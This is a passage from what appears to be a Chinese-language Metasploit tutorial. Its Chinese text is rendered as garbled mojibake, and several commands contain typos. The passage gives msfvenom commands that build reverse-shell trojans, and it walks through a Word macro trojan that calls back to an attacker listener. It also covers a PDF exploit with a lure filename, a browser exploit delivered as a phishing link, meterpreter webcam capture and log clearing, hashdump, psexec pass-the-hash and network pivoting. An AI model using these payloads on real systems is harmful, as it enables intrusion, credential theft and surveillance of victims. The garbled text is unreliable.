æ‰§è¡Œnmapå¹¶è‡ªåŠ¨è®°å½•è¾“å‡º<br>db_rebuild_cacheÂ  Â é‡å»ºæ•°æ®åº“å­˜å‚¨çš„æ¨¡å—é«˜é€Ÿç¼“å­˜<br>db_statusÂ  Â æ˜¾ç¤ºå½“å‰çš„æ•°æ®åº“çŠ¶æ€<br>hostsÂ  Â åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰ä¸»æœº<br>lootÂ  Â åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æˆ˜åˆ©å“<br>notesÂ  Â åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰ç¬”è®°<br>servicesÂ  Â åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æœåŠ¡<br>vulnsÂ  Â åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ¼æ´<br>workspaceÂ  Â åœ¨æ•°æ®åº“å·¥ä½œåŒºä¹‹é—´åˆ‡æ¢<br>Â <br>å‡­è¯åç«¯å‘½ä»¤<br>credsÂ  Â åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰å‡­æ®</p>
<hr>
<h5 id="2-2-2-meterpreterå‘½ä»¤"><a href="#2-2-2-meterpreterå‘½ä»¤" class="headerlink" title="2.2.2 meterpreterå‘½ä»¤"></a>2.2.2 meterpreterå‘½ä»¤</h5><hr>
<p>.background    ä»meterpreteré€€å‡ºåˆ°msfé‡Œ</p>
<p>.sessions -i 1   è¿›å…¥meterpreteré‡Œ</p>
<p>.cat   æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<p>.clearev   æ¸…æ¥šæ—¥å¿—</p>
<p>.download  ä»è¿œç¨‹æœºå™¨ä¸‹è½½æ–‡ä»¶  download c:\boot.ini</p>
<p>.edit  æ‰“å¼€æ–‡ä»¶ã€‚ meterpreter &gt; edit edit.txt</p>
<p>.execute  å‘½ä»¤åœ¨ç›®æ ‡ä¸Šè¿è¡Œä¸€ä¸ªå‘½ä»¤ã€‚meterpreter &gt; execute -f cmd.exe -i -Hã€‚</p>
<p>.getuid  æ˜¾ç¤ºæœåŠ¡å™¨ä¸Šè¿è¡Œçš„ç”¨æˆ·</p>
<p>.idletume  æ˜¾ç¤ºè¿œç¨‹æœºå™¨ä¸Šçš„ç”¨æˆ·ç©ºé—²çš„ç§’æ•°</p>
<p>.lpwd&gt;lcd  lpwd-æ˜¾ç¤ºå½“å‰ç›®å½• lcd-è·³è½¬åˆ°å“ªä¸ªç›®å½•</p>
<p>.migrate  è¿ç§»åˆ°å—å®³è€…çš„å¦ä¸€ä¸ªè¿›ç¨‹ meterpreter &gt; run post/windows/manage/migrate </p>
<p>.ps  æ˜¾ç¤ºæ­£åœ¨è¿è¡Œè¿›ç¨‹çš„åˆ—è¡¨</p>
<p>.resource  æ‰§è¡Œæ–‡æœ¬é‡Œçš„meterpreterå‘½ä»¤    resource 1.txt</p>
<p>.search  æŸ¥æ‰¾ç‰¹å®šæ–‡ä»¶  search -f *.doc</p>
<p>.shell  å°†æä¾›ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ ‡å‡†shell</p>
<p>.upload ä¸Šä¼ æ–‡ä»¶ meterpreter &gt; upload evil_trojan.exe c:\windows\system32 </p>
<p>.webcam_list  æ˜¾ç¤ºç½‘ç»œæ‘„åƒå¤´</p>
<p>.webcam_snap  ä»ç›®æ ‡ç³»ç»Ÿä¸Šå·²è¿æ¥ç½‘ç»œçš„æ‘„åƒå¤´æŠ“å–å›¾ç‰‡ </p>
<hr>
<h4 id="2-3-msfç”Ÿæˆæœ¨é©¬æ•™ç¨‹"><a href="#2-3-msfç”Ÿæˆæœ¨é©¬æ•™ç¨‹" class="headerlink" title="2.3 msfç”Ÿæˆæœ¨é©¬æ•™ç¨‹"></a>2.3 msfç”Ÿæˆæœ¨é©¬æ•™ç¨‹</h4><p><del>æŠŠç½‘ä¸Šçš„ä¸€äº›èµ„æºæ•´åˆäº†ä¸€ä¸‹ï¼Œè¿˜æŠŠwordå®æœ¨é©¬ç­‰ä¹ŸåŠ è¿›æ¥äº†ï¼Œæ–¹ä¾¿å¤§å®¶åˆ©ç”¨</del></p>
<h5 id="2-3-1-ç”Ÿæˆæœ¨é©¬å‘½ä»¤ï¼šmsfvenom"><a href="#2-3-1-ç”Ÿæˆæœ¨é©¬å‘½ä»¤ï¼šmsfvenom" class="headerlink" title="2.3.1 ç”Ÿæˆæœ¨é©¬å‘½ä»¤ï¼šmsfvenom"></a>2.3.1 ç”Ÿæˆæœ¨é©¬å‘½ä»¤ï¼š<code>msfvenom</code></h5><p>msfcenomè¯¦ç»†è¯­æ³•<br>-e, â€“encoder [encoder] æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰<br>-a, â€“arch &lt; architecture&gt; æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„<br>â€“platform &lt; platform&gt; æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°<br>-s, â€“space &lt; length&gt; è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦<br>-b, â€“bad-chars &lt; list&gt; è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œæ¯”å¦‚: &amp; #039;\x00\xff&amp; #039;<br>-i, â€“iterations &lt; count&gt; æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°<br>-c, â€“add-code &lt; path&gt; æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶<br>-x, â€“template &lt; path&gt; æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿<br>-k, â€“keep ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ<br>â€“payload-options åˆ—ä¸¾payloadçš„æ ‡å‡†é€‰é¡¹<br>-o, â€“out &lt; path&gt; ä¿å­˜payload<br>-v, â€“var-name &lt; name&gt; æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼<br>â€“shellest æœ€å°åŒ–ç”Ÿæˆpayload<br>-h, â€“help æŸ¥çœ‹å¸®åŠ©é€‰é¡¹<br>â€“help-formats æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨</p>
<h5 id="2-3-2-ç”Ÿæˆæœ¨é©¬è¯­å¥"><a href="#2-3-2-ç”Ÿæˆæœ¨é©¬è¯­å¥" class="headerlink" title="2.3.2 ç”Ÿæˆæœ¨é©¬è¯­å¥"></a>2.3.2 ç”Ÿæˆæœ¨é©¬è¯­å¥</h5><p>äºŒè¿›åˆ¶<br>linux:<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</code></p>
<p>windows:<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe</code></p>
<p>mac: <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</code></p>
<p>web<br>php:<code>msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php</code> <code>cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php â€™ | tr -d â€˜\nâ€™ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p>
<p>asp:<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</code></p>
<p>jap:<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</code></p>
<p>war:<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</code></p>
<p>è„šæœ¬<br>python:<code>msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py</code></p>
<p>bash:<code>msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh</code></p>
<p>perl:<code>msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl</code></p>
<p>åŸºäºpdfçš„shellcode<br><code>use exploit/windows/fileformat/adobe_utilprintf</code><br>msf5 exploit(adobe_utilprintf)&gt;<code>set FILENAME BestComputers-UpgradeInstructions.pdfset</code></p>
<p><code>PAYLOAD windows/meterpreter/reverse_tcp</code><br><em>å…¶ä»–çš„å°±è‡ªå·±å¡«å°±å¥½äº†</em></p>
<hr>
<p>è¯»åˆ°è¿™é‡Œï¼Œå¤§å®¶è‚¯å®šä¼šæ„Ÿåˆ°ç–‘æƒ‘ï¼Œç”Ÿæˆæœ¨é©¬åæ€ä¹ˆè·å–æƒé™å‘¢ï¼Œé‚£ä¹ˆæˆ‘åœ¨è¿™é‡Œç»™å‡ºç­”å¤ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç”¨ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ç”¨msfçš„ç›‘å¬æ¨¡å—ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯ncåå¼¹äº†ï¼Œè¿™é‡Œæˆ‘å°±è®²è§£ä¸‹msfçš„ç›‘å¬æ¨¡å—ï¼Œncå¤§å®¶å°±è‡ªè¡Œç™¾åº¦ä¸‹</p>
<hr>
<p>ç›‘å¬æ¨¡å—ï¼š<code>use exploit/multi/handler</code><br>æ·»åŠ ip,ç«¯å£ä¸éœ€è¦è®²è§£å§<br>æ·»åŠ payload:<code>set payload</code><br>payloadæ˜¯ç”Ÿæˆæœ¨é©¬çš„payload<br>ç„¶åè¿è¡Œï¼š<code>exploit</code></p>
<p>æ¥ä¸‹æ¥çš„æ¯”è¾ƒæœ‰æ„æ€ï¼ŒåŸºäºwordçš„shellcode</p>
<p>ç”Ÿæˆpayload:<code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.171.129 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe</code></p>
<p>ç”Ÿæˆçš„å†…å®¹åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯å®æ‰§è¡Œçš„vbaä»£ç ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯payload<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/021.png"></p>
<p>ç„¶åç”Ÿæˆä¸€ä¸ªç©ºç™½çš„wordæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/022.png"></p>
<p>å®åéšä¾¿è¾“å…¥ï¼Œç„¶åç‚¹å‡»åˆ›å»ºï¼Œæˆ‘ä»¬æ‹·è´ç”Ÿæˆçš„ç¬¬ä¸€éƒ¨åˆ†çš„å†…å®¹åˆ°è¿™é‡Œï¼Œç„¶åç‚¹å‡»ä¿å­˜</p>
<p><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/023.png"></p>
<p>æˆ‘ä»¬ç°åœ¨å†æ‰“å¼€å®ï¼Œå¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†ä¸‹é¢å‡ ä¸ªå®<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/024.png"></p>
<p>ç„¶åæˆ‘ä»¬æ‹·è´ç¬¬äºŒéƒ¨åˆ†ï¼Œè´´åˆ°wordæ–‡æ¡£çš„æ­£æ–‡é‡Œé¢ï¼Œç„¶åä¿å­˜å…³é—­<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/025.png"><br>ç„¶ååœ¨Kaliä¸Šå¯åŠ¨ä¾¦å¬<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.171.129<br>exploit<br>å½“åœ¨Windowså¯åŠ¨åˆšåˆšçš„wordæ—¶ï¼Œæˆ‘ä»¬å°±å–å¾—shelläº†</p>
<h4 id="2-4-é“¾æ¥é’“é±¼"><a href="#2-4-é“¾æ¥é’“é±¼" class="headerlink" title="2.4 é“¾æ¥é’“é±¼"></a>2.4 é“¾æ¥é’“é±¼</h4><p>è¿è¡Œå‘½ä»¤ï¼š<code>use exploit/windows/browser/ms10_002_aurora</code><br>æ¥ç€æ·»åŠ ï¼š<code>set URIPATH /</code><br>åŠ ä¸Špayload:<code>set PAYLOAD windows/meterpreter/reverse_tcp </code><br>è¿è¡Œï¼š<code>exploit -j</code><br>å½“ç›®æ ‡è®¿é—®æˆ‘ä»¬çš„æ¶æ„URLæ—¶ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†shell</p>
<hr>
<p>####<center>2.5 å†…ç½‘ç©¿é€</center></p>
<p>å†…ç½‘ç©¿é€ä¸çŸ¥é“æˆ‘ç†è§£çš„æœ‰æ²¡æœ‰æ¯›ç—…ï¼Œå°±ç›¸å½“äºåœ¨ç›®æ ‡ç³»ç»Ÿæ·»åŠ è·¯ç”±ï¼Œç„¶åè½¬å‘å‡ºå»ï¼Œè¿™è¾¹æˆ‘åªæ¥å—ä½¿ç”¨msfæ–¹æ³•æ“ä½œï¼Œå¯èƒ½æ„Ÿè§‰æœ‰ç‚¹æ€ªæ€ªçš„ï¼Œä½†æ˜¯æ‡‚å¾—éƒ½æ‡‚ï¼Œå¥½å…„å¼Ÿã€‚</p>
<h5 id="2-5-1-routeæ·»åŠ è·¯ç”±"><a href="#2-5-1-routeæ·»åŠ è·¯ç”±" class="headerlink" title="2.5.1 routeæ·»åŠ è·¯ç”±"></a>2.5.1 routeæ·»åŠ è·¯ç”±</h5><p>å‘½ä»¤è¯¦ç»†ï¼š</p>
<ol>
<li>add - åˆ¶ä½œæ–°è·¯çº¿</li>
<li>removeÂ - åˆ é™¤è·¯çº¿; â€˜delâ€™æ˜¯ä¸€ä¸ªåˆ«å</li>
<li>flushÂ - åˆ é™¤æ‰€æœ‰è·¯çº¿</li>
<li>getÂ - æ˜¾ç¤ºç»™å®šç›®æ ‡çš„è·¯çº¿</li>
<li>printÂ - æ˜¾ç¤ºæ‰€æœ‰æ´»åŠ¨è·¯çº¿</li>
</ol>
<p>#<del>è¿™è¾¹å’Œå¤§å®¶è®²ä¸‹ï¼Œæ­¤æ–¹æ³•æ˜¯è·å–åˆ°äº†meterpreteråçš„æ“ä½œï¼Œä¸è¿‡ä¹Ÿå¯¹ï¼Œæ²¡æœ‰è·å–ä¹Ÿä¸ä¼šåšåˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘çœŸæ˜¯åºŸè¯äº†ã€‚</del></p>
<p>ä¾‹å­ï¼š<br>é€šè¿‡session 1ä¸ºä»192.168.0.0åˆ°192.168.0.0çš„æ‰€æœ‰ä¸»æœºæ·»åŠ è·¯ç”±<br><code>route add 192.168.0.0 255.255.255.0 1</code><br><code>route add 192.168.0.0/24 1</code></p>
<p>åˆ é™¤ä¸Šè¿°è·¯çº¿<br><code>route remove 192.168.0.0/24 1</code><br><code>route del 192.168.0.0 255.255.255.0 1</code></p>
<hr>
<p>æ˜¾ç¤ºå°†ç”¨äºç»™å®šä¸»æœºæˆ–ç½‘ç»œçš„è·¯çº¿<br><code>route get 192.168.0.11</code></p>
<h5 id="2-5-2-autoroute-æ·»åŠ è·¯ç”±"><a href="#2-5-2-autoroute-æ·»åŠ è·¯ç”±" class="headerlink" title="2.5.2 autoroute æ·»åŠ è·¯ç”±"></a>2.5.2 autoroute æ·»åŠ è·¯ç”±</h5><p>å‘½ä»¤è¯´æ˜ï¼š</p>
<ol>
<li><code>run autoroute -s 10.1.1.0 -n 255.255.255.0#å°†è·¯ç”±æ·»åŠ åˆ°10.10.10.1/255.255.255.0</code></li>
<li><code>run autoroute -s 10.10.10.1#ç½‘ç»œæ©ç é»˜è®¤ä¸º255.255.0</code></li>
<li><code>run autoroute -s 10.10.1/24#CIDRè¡¨ç¤ºæ³•ä¹Ÿå¯ä»¥</code></li>
<li><code>run autoroute -p#æ‰“å°æ´»åŠ¨è·¯ç”±è¡¨</code></li>
<li><code>run autoroute -d -s 10.10.10.1#åˆ é™¤10.10.1/255.255.0è·¯ç”±</code></li>
<li><code>ä½¿ç”¨â€œrouteâ€å’Œâ€œipconfigâ€metermeterå‘½ä»¤äº†è§£å¯ç”¨è·¯ç”±</code></li>
</ol>
<hr>
<hr>
<p><code>run autorpute -s 10.1.13.0/24</code> ç»‘å®šè·¯ç”±</p>
<hr>
<p><code>run autoroute -p</code> æŸ¥çœ‹</p>
<hr>
<p><strong>_ç°åœ¨å¼€å§‹ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œå‡å¦‚ç°åœ¨æµ‹è¯•ä¸€ä¸ªå…¬å¸ç³»ç»Ÿï¼Œæ‹¿åˆ°äº†ä¸€å°ä¸»æœºçš„æƒé™ï¼ŒæŸ¥çœ‹å®ƒçš„ipæ®µå‘ç°ï¼Œé™¤äº†å®ƒæœ¬èº«çš„æ®µï¼Œè¿˜å­˜åœ¨<code>10.1.13.0/24</code>çš„æ®µï¼Œé‚£ä¹ˆé¦–å…ˆæ·»åŠ 10.1.13.0/24çš„è·¯ç”±ï¼Œ<code>run autoroute -s 10.1.13.0/24</code>,ç„¶åæˆ‘ä»¬è¿˜å¾—ææƒåˆ°systemï¼Œç„¶åè½¬å‚¨å¯†ç æ•£åˆ—ï¼Œé€€å‡ºmeterpreter,<code>background</code></strong></p>
<p>meterpdreter &gt; <code>getsystem</code><br>â€¦.xxxx system<br>meterpreter &gt; <code>run hashdump</code><br>*<br>*<br>administrator:dwadwadwadwadwadwadawd<br>guest:Dwadwadwad</p>
<hr>
<p><strong><em><em>è™½ç„¶æˆ‘ä»¬æ·»åŠ äº†å®ƒç¬¬äºŒä¸ªipæ®µçš„è·¯ç”±ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸çŸ¥é“å®ƒç¬¬äºŒä¸ªipæ®µæœ‰æ²¡æœ‰å­˜æ´»ä¸»æœºï¼Œç°åœ¨ç”¨msfæ‰«æä¸€ä¸‹ï¼Œè¿™é‡Œç”¨åŸºæœ¬çš„tcpç«¯å£æ‰«æç¨‹åºæ¥æŸ¥æ‰¾ç«¯å£139å’Œ445</em></em></strong></p>
<hr>
<ol>
<li>msf:&gt;<code>use auxiliary/scanner/portscan/tcp</code>#è¿›å…¥æ‰«ææ¨¡å—</li>
<li>msf auxiliary(tcp)&gt; <code>set rhosts 10.1.13.0/24</code></li>
<li>msf auxiliary(tcp)&gt;<code>set ports 139,445</code></li>
<li>msf auxiliary(tcp)&gt;<code>set threads 50</code></li>
<li>msf auxiliary(tcp)&gt;<code>run</code></li>
</ol>
<hr>
<p>å‡è®¾æˆ‘ä»¬å‘ç°äº†ä¸€å°é¢å¤–çš„æœºå™¨ï¼Œæˆ‘ä»¬å°è¯•å°†æˆ‘ä»¬æ”¶é›†çš„å¯†ç å“ˆå¸Œä¸psexecæ¼æ´åˆ©ç”¨æ¨¡å—ä¸€èµ·ä½¿ç”¨ï¼Œæœ¬åœ°ç®¡ç†å‘˜å¯†ç åœ¨æ•´ä¸ªä¼ä¸šä¸­é€šå¸¸æ˜¯ç›¸åŒçš„ã€‚</p>
<hr>
<p>msf &gt; <code>use exploit/windows/smb/psexec</code></p>
<p>msf exploit(psexec) &gt; <code>set rhost 10.1013.2</code></p>
<p>msf exploit(psexec) &gt; <code>set smbuser Administrator</code></p>
<p>msf exploit(psexec) &gt; <code>set smbpass xxxxxxxxxxxx</code></p>
<p>msf exploit(psexec) &gt; <code>set payload windows/meterpreter/bind_tcp</code></p>
<p>msf exploit(psexec) &gt; <code>exploit</code></p>
<p>#<em><del>è¿™è¾¹å°±æ˜¾ç¤ºäº†æˆåŠŸè·å–meterprter</del></em></p>
<hr>
<h5 id="2-5-3-portfwd-æ·»åŠ è·¯ç”±"><a href="#2-5-3-portfwd-æ·»åŠ è·¯ç”±" class="headerlink" title="2.5.3 portfwd æ·»åŠ è·¯ç”±"></a>2.5.3 portfwd æ·»åŠ è·¯ç”±</h5><p>å‘½ä»¤è¯´æ˜ï¼š</p>
<center>options:é€‰é¡¹</center>
1. -L :ç”¨äºæŒ‡å®šç›‘å¬ä¸»æœºã€‚é™¤ééœ€è¦åœ¨ç‰¹å®šç½‘ç»œé€‚é…å™¨ä¸Šè¿›è¡Œè½¬å‘ï¼Œå¦åˆ™å¯ä»¥çœç•¥æ­¤é€‰é¡¹ã€‚å¦‚æœæœªè¾“å…¥ä»»ä½•å€¼ï¼Œåˆ™å°†ä½¿ç”¨0.0.0.0.
2. -h :æ˜¾ç¤ºä»¥ä¸Šä¿¡æ¯
3. -l :è¿™æ˜¯ä¸€ä¸ªæœ¬åœ°ç«¯å£ï¼Œå®ƒå°†åœ¨æ”»å‡»æœºä¸Šç›‘å¬ï¼Œä¸æ­¤ç«¯å£çš„è¿æ¥å°†è¢«è½¬å‘åˆ°è¿œç¨‹ç³»ç»Ÿã€‚
4. -p :tcpè¿æ¥å°†è½¬å‘åˆ°çš„ç«¯å£ã€‚
5. -r :è¿æ¥è¢«ä¸­ç»§åˆ°çš„ipåœ°å€ï¼ˆç›®æ ‡ï¼‰ã€‚

<hr>
<center>Arguments:å‚æ•°</center>
1. Add: è¯¥å‚æ•°ç”¨äºåˆ›å»ºè½¬å‘ã€‚
2. Delete: è¿™å°†æˆ‘ä»¬çš„è½¬å‘ç«¯å£åˆ—è¡¨ä¸­åˆ é™¤å…ˆå‰çš„æ¡ç›®ã€‚
3. List: è¿™å°†åˆ—å‡ºå½“å‰è½¬å‘çš„æ‰€æœ‰ç«¯å£ã€‚
4. Flush: è¿™å°†åˆ é™¤æˆ‘ä»¬è½¬å‘åˆ—è¡¨ä¸­çš„æ‰€æœ‰ç«¯å£ã€‚
<center>Syntax:è¯­æ³•</center>
add > 
åœ¨meteroreter shellä¸­ï¼Œä»¥ä¸‹åˆ—æ–¹å¼ä½¿ç”¨è¯¥å‘½ä»¤ï¼š

<hr>
<p>meterpreter &gt; <code>portfwd add -l 3389 -p 3389 -r xxx.xx.xx.xx</code></p>
<hr>
<pre><code>â€¢ addä¼šå°†ç«¯å£è½¬å‘æ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œå¹¶å°†ä¸ºæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªéš§é“ã€‚è¯·æ³¨æ„ï¼Œæ­¤é€šé“ä¹Ÿå°†å­˜åœ¨äºMetasploitæ§åˆ¶å°ä¹‹å¤–ï¼Œä½¿å…¶å¯ç”¨äºä»»ä½•ç»ˆç«¯ä¼šè¯ã€‚
â€¢ -l 3389æ˜¯æœ¬åœ°ç«¯å£ï¼Œå°†è¢«ç›‘å¬å¹¶è½¬å‘åˆ°æˆ‘ä»¬çš„ç›®æ ‡ã€‚è¿™å¯ä»¥æ˜¯æ‚¨çš„æœºå™¨ä¸Šçš„ä»»ä½•ç«¯å£ï¼Œåªè¦å®ƒå°šæœªè¢«ä½¿ç”¨ã€‚
â€¢ -p 3389æ˜¯æˆ‘ä»¬çš„å®šå‘ä¸»æœºä¸Šçš„ç›®æ ‡ç«¯å£ã€‚
â€¢ -r [target host]æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ç³»ç»Ÿçš„IPæˆ–ä¸»æœºåã€‚</code></pre>
<hr>
<hr>
<p>delete &gt;<br>ä¸å‰é¢çš„å‘½ä»¤éå¸¸ç›¸ä¼¼ï¼Œå®ƒæ˜¯åˆ é™¤æ¡ç›®ã€‚å†æ¬¡ä»æœ‰æ•ˆçš„Meterpreterä¼šè¯ä¸­ï¼Œæˆ‘ä»¬è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š<br>meterpreter &gt; <code>portfwd delete â€“l 3389 â€“p 3389 â€“r [target host]</code></p>
<hr>
<hr>
<p>ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶ğŸ¥¶</p>
<hr>
<p>list &gt;<br>è¿™ä¸ªå‚æ•°ä¸éœ€è¦ä»»ä½•é€‰é¡¹ï¼Œå¹¶ä¸ºæˆ‘ä»¬æä¾›å½“å‰æ­£åœ¨ä¾¦å¬å’Œè½¬å‘çš„ç«¯å£çš„åˆ—è¡¨ã€‚<br>meterpreter &gt; <code>portfwd list</code></p>
<hr>
<p>ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³ğŸ˜ğŸ¥³ğŸ¥³ğŸ¥³ğŸ¥³</p>
<hr>
<p>flush &gt;<br>è¿™ä¸ªå‚æ•°å°†å…è®¸æˆ‘ä»¬ä¸€æ¬¡æ€§ç§»é™¤æ‰€æœ‰æœ¬åœ°ç«¯å£ã€‚<br>meterpreter &gt; <code>portfwd flush</code></p>
<hr>
<center>portfwdç”¨æ³•ç¤ºä¾‹ä¸€ï¼š</center>
åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†åœ¨æˆ‘ä»¬çš„æœ¬åœ°æœºå™¨ä¸Šæ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œå¹¶è®©æˆ‘ä»¬çš„Meterpreterä¼šè¯åœ¨åŒä¸€ç«¯å£ä¸Šå‘æˆ‘ä»¬çš„å—å®³è€…è½¬å‘è¿æ¥ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ç«¯å£3389ï¼Œè¿™æ˜¯è¿œç¨‹æ¡Œé¢è¿æ¥çš„Windowsé»˜è®¤ç«¯å£

<p>å‚ä¸è€…ipï¼š 172.16.194.141<br>å—å®³è€…æœºå™¨ï¼š172.16.194.144ã€192.168.1.191</p>
<p>æˆ‘ä»¬æ˜¯é€šè¿‡192çš„å…¥ä¾µçš„ï¼Œå‘ç°å­˜åœ¨172çš„æ®µï¼Œç°åœ¨å¼€å§‹ç«¯å£è½¬å‘<br>meterpreter &gt; <code>portfwd add -l 3389 -p 3389 -r 172.16.194.141</code><br>æŸ¥çœ‹ç«¯å£ç›‘å¬ï¼š<code>netstat -antp</code></p>
<hr>
<p>ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡</p>
<hr>
<center>portfwdç”¨æ³•ç¤ºä¾‹äºŒ</center>

<p>å‡å¦‚ç›®æ ‡æœºå™¨å­˜åœ¨ms08-067æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰ç›¸åŒçš„æŠ€æœ¯æŠŠæ­£ç¡®çš„ç«¯å£è½¬å‘ç»™æ‰€éœ€çš„æ¼æ´ã€‚<br>æˆ‘ä»¬è¿™è¾¹è½¬å‘445ç«¯å£ï¼Œç„¶åè¿è¡Œã€‚</p>
<p>msf exploit(ms08_067_netapi) &gt; show options<br>Module options (exploit/windows/smb/ms08_067_netapi):<br>Name     Current Setting  Required  Description</p>
<hr>
<p>   RHOST    127.0.0.1        yes       The target address<br>   RPORT    445              yes       Set the SMB service port<br>   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)<br>Payload options (windows/shell/reverse_tcp):<br>Name      Current Setting  Required  Description</p>
<hr>
<p>   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)<br>   LHOST     192.168.1.162    yes       The listen address<br>   LPORT     4444             yes       The listen port<br>Exploit target:<br>Id  Name</p>
<hr>
